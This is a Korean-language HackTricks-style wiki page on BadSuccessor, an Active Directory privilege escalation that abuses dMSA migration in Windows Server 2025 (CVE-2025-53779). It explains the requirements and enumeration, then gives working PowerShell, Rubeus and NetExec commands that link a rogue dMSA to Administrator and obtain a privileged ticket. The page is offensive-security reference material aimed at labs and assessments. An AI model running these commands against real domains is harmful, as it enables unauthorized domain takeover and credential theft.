# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 개요

**BadSuccessor**는 **Windows Server 2025**에 도입된 **delegated Managed Service Account** (**dMSA**) migration workflow를 악용합니다. dMSA는 **`msDS-ManagedAccountPrecededByLink`**를 통해 legacy account에 연결할 수 있으며, **`msDS-DelegatedMSAState`**에 저장된 migration state를 통해 이동할 수 있습니다. 공격자가 writable OU에 dMSA를 생성하고 해당 attributes를 제어할 수 있다면, KDC는 연결된 account의 **authorization context**를 포함한 ticket을 공격자가 제어하는 dMSA에 발급할 수 있습니다.<sup>[[2]](#references)</sup>

실제로 이는 delegated OU rights만 가진 low-privileged user가 새 dMSA를 생성하고, 이를 `Administrator`에 연결한 다음 migration state를 완료하여 PAC에 **Domain Admins**와 같은 privileged group이 포함된 TGT를 획득할 수 있음을 의미합니다.<sup>[[2]](#references)</sup>

## 중요한 dMSA migration 세부 정보

- dMSA는 **Windows Server 2025** feature입니다.
- `Start-ADServiceAccountMigration`은 migration을 **started** state로 설정합니다.
- `Complete-ADServiceAccountMigration`은 migration을 **completed** state로 설정합니다.
- `msDS-DelegatedMSAState = 1`은 migration이 시작되었음을 의미합니다.
- `msDS-DelegatedMSAState = 2`는 migration이 완료되었음을 의미합니다.
- 정상적인 migration 중에는 dMSA가 superseded account를 투명하게 대체하도록 설계되므로, KDC/LSA는 이전 account가 이미 보유하고 있던 access를 유지합니다.<sup>[[3]](#references)</sup>

Microsoft Learn은 migration 중 original account가 dMSA에 연결되며, dMSA가 old account가 access할 수 있었던 리소스에 access하도록 설계되었다고도 설명합니다.<sup>[[3]](#references)</sup> 이것이 BadSuccessor가 악용하는 security assumption입니다.<sup>[[2]](#references)</sup>

## 요구 사항

1. **dMSA가 존재하는** domain. 즉, AD 측에 **Windows Server 2025** support가 있어야 합니다.
2. 공격자가 일부 OU에서 `msDS-DelegatedManagedServiceAccount` objects를 **create**할 수 있거나, 해당 OU에서 이에 상응하는 broad child-object creation rights를 보유해야 합니다.
3. 공격자가 관련 dMSA attributes를 **write**할 수 있거나, 방금 생성한 dMSA를 완전히 control할 수 있어야 합니다.
4. 공격자가 domain-joined context 또는 LDAP/Kerberos에 도달할 수 있는 tunnel에서 Kerberos tickets를 request할 수 있어야 합니다.<sup>[[2]](#references)</sup>

### 실무 확인 방법

가장 명확한 operator signal은 domain/forest level을 확인하고, 해당 environment가 이미 새로운 Server 2025 stack을 사용하고 있는지 검증하는 것입니다:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
`Windows2025Domain` 및 `Windows2025Forest`와 같은 값이 보이면 **BadSuccessor / dMSA migration abuse**를 우선적으로 확인하세요.

또한 public tooling을 사용하여 dMSA 생성을 위해 위임된 쓰기 가능한 OU를 열거할 수 있습니다:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. create-child 권한을 위임받은 OU에 dMSA를 생성합니다.
2. **`msDS-ManagedAccountPrecededByLink`**를 `CN=Administrator,CN=Users,DC=corp,DC=local`과 같은 privileged target의 DN으로 설정합니다.
3. **`msDS-DelegatedMSAState`**를 `2`로 설정하여 migration이 완료된 것으로 표시합니다.
4. 새로운 dMSA에 대한 TGT를 요청하고, 반환된 ticket을 사용하여 privileged services에 액세스합니다.<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
티켓 요청 / 운영 도구 예시:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## 이것이 단순한 privilege escalation 이상인 이유

정상적인 migration 중에는 cutover 전에 이전 계정에 발급된 ticket을 새 dMSA도 처리할 수 있어야 합니다. 이것이 dMSA 관련 ticket material에 **`KERB-DMSA-KEY-PACKAGE`** flow에서 **current** 및 **previous** key가 포함될 수 있는 이유입니다.<sup>[[2]](#references)</sup>

공격자가 제어하는 가짜 migration에서는 이러한 동작으로 인해 BadSuccessor가 다음과 같이 악용될 수 있습니다.<sup>[[2]](#references)</sup>

- PAC에서 privileged group SID를 상속하여 **privilege escalation**을 수행합니다.
- previous-key 처리로 인해 취약한 workflow에서 predecessor의 RC4/NT hash와 동등한 material이 노출될 수 있으므로 **credential material exposure**가 발생합니다.

따라서 이 technique은 직접적인 domain takeover뿐만 아니라 pass-the-hash나 더 광범위한 credential compromise와 같은 후속 작업에도 유용합니다.

## Patch 상태 관련 참고 사항

기존 BadSuccessor 동작은 **단순히 2025년 preview에서만 존재했던 이론적인 문제**가 아닙니다. Microsoft는 이 문제에 **CVE-2025-53779**를 할당했으며 **2025년 8월**에 security update를 공개했습니다.<sup>[[4]](#references)</sup> 다음과 같은 환경을 위해 이 attack을 계속 문서화해야 합니다.

- **labs / CTFs / assume-breach exercises**
- **patch되지 않은 Windows Server 2025 환경**
- **assessment 중 OU delegations 및 dMSA exposure 검증**

dMSA가 존재한다는 이유만으로 Windows Server 2025 domain이 vulnerable하다고 가정하지 마십시오. patch level을 확인하고 신중하게 test하십시오.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
